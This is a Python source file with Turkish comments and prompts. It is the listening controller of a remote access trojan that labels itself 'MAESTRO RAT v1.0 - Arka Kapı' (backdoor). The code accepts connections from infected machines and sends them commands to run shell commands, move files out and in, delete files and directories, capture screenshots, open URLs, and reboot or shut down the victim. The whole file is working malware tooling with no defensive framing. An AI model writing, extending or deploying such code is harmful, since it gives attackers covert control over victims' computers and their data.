import socket
import argparse
import threading
import os


commands = [
    ("exit", "İstemci bağlantısını sonlandırır."),
    ("execute", "Belirli bir terminal komutunu istemcide çalıştırır."),
    ("openfile [dosya_adı]", "Belirtilen dosyanın içeriğini sunucudan istemciye gönderir."),
    ("deletefile [dosya_adı]", "Belirtilen dosyayı siler."),
    ("deletedirectory [dizin_adı]", "Belirtilen dizini siler."),
    ("ls / dir", "İstemcideki mevcut dizinin içeriğini listeler."),
    ("cd [hedef_klasör]", "İstemcideki çalışma dizinini değiştirir."),
    ("createdirectory [klasör_adı]", "Yeni bir klasör oluşturur."),
    ("createfile [dosya_adı]", "Yeni bir dosya oluşturur."),
    ("editfile [metin] >> [dosya_adı]", "Belirtilen dosyanın sonuna metin ekler."),
    ("whoami", "İstemcide oturum açmış kullanıcıyı döndürür."),
    ("ifconfig", "İstemcinin ağ bilgilerini döndürür."),
    ("cpu", "İstemcinin CPU bilgilerini döndürür."),
    ("memory", "İstemcinin bellek kullanım bilgilerini döndürür."),
    ("osinfo", "İstemcinin işletim sistemi bilgilerini döndürür."),
    ("browser [url]", "Belirtilen URL'yi istemcide açar."),
    ("upload", "İstemciden sunucuya dosya yükler."),
    ("download", "İstemciden istemciye dosya indirir."),
    ("screenshot", "İstemcinin ekran görüntüsünü alır."),
    ("restart", "İstemciyi yeniden başlatır."),
    ("poweroff", "İstemciyi kapatır."),
    ("cd [dizin]", "Dizini değiştirir."),
    ("clear", "Terminali temizler.")
]

print("{:<40} {}".format("Komut", "Açıklama"))
print("="*60)
for command, description in commands:
    print("{:<40} {}".format(command, description))


def handle_client(conn, addr):
    print(f"Bağlantı alındı: {addr}")

    try:        
        while True:
            try:
                komut = input("Komutu giriniz ('exit' yazarak çıkabilirsiniz): ")
                conn.send(komut.encode())
                
                if komut == 'exit':
                    break
                
                elif not komut:
                    continue
                    
                elif komut == 'commandlist' :
                    print("{:<40} {}".format("Komut", "Açıklama"))
                    print("="*60)
                    
                elif komut == 'clear':
                    x = os.name 
                    if x == 'posix':
                        os.system('clear')
                    else:
                        os.system('cls')                        

                elif komut == 'execute':
                    print("Lütfen 'execute' komutu için bir komut girin:")
                    islem = input()
                    conn.send(islem.encode())
                    received_data = conn.recv(8192)
                    print(received_data.decode(errors='ignore'))
                
                                
                elif komut == 'upload':
                    islem = input("Upload edilecek dosya ismini giriniz : ")
                    dosya_adi = islem
                    conn.send(dosya_adi.encode())
                    try:
                        with open(dosya_adi, 'rb') as file:
                            while (data := file.read(8192)):
                                conn.send(data)
                            conn.send('UPLOAD_COMPLETE'.encode())
                            print(f'{dosya_adi} başarılı bir şekilde upload edildi.')
                    except FileNotFoundError:
                        print('HATA: Dosya bulunamadı.')
                                        
                elif komut == 'download':
                    islem = input("İndirilecek Dosya İsmini Giriniz : ")
                    conn.send(islem.encode())
                    with open(islem, 'wb') as file:
                        while True:
                            data = conn.recv(8192)
                            if data.endswith('DOWNLOAD_COMPLETE'.encode()):
                                data = data[:-len('DOWNLOAD_COMPLETE'.encode())]
                                file.write(data)
                                break
                            file.write(data)
                        print(f"{islem} dosyası başarılı bir şekilde bulunduğunuz dizine indirildi.[√]")
                                     
                elif komut == 'screenshot':
                    with open('screenshothacked.png', 'wb') as file:
                        while True:
                            file_data = conn.recv(8192)
                            if file_data.endswith(b"screenshot_complete"):
                                file_data = file_data[:-len("screenshot_complete")]
                                file.write(file_data)
                                break
                            file.write(file_data)
                        print("Ekran görüntüsü bulunduğunuz dizine kayıt edildi.")
                    
                elif komut.startswith('browser'):
                    link = komut.split(" ", 1)[1]
                    conn.send(link.encode())
                    sonuc = conn.recv(8192).decode()
                    print(sonuc)
                
                else:
                    received_data = conn.recv(8192)
                    print(received_data.decode(errors='ignore'))
                    
            except Exception as e:
                print(f"Hata: {str(e)}")
                break

    except Exception as e:
        print(f"Bağlantı hatası: {str(e)}")

    finally:
        conn.close()

def main():
    parser = argparse.ArgumentParser(description='MAESTRO RAT v1.0 - Arka Kapı')
    parser.add_argument('-lhost', dest='ip', help='Hedef IP adresi', required=True)
    parser.add_argument('-lport', dest='port', help='Hedef port numarası', required=True)
    args = parser.parse_args()

    ip = args.ip
    port = int(args.port)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((ip, port))
        s.listen(5)
        print(f"{ip}:{port} dinleniyor...")

        while True:
            try:
                conn, addr = s.accept()
                client_thread = threading.Thread(target=handle_client, args=(conn, addr))
                client_thread.start()
            except Exception as e:
                print(f"Bağlantı kabul hatası: {str(e)}")

if __name__ == "__main__":
    main()
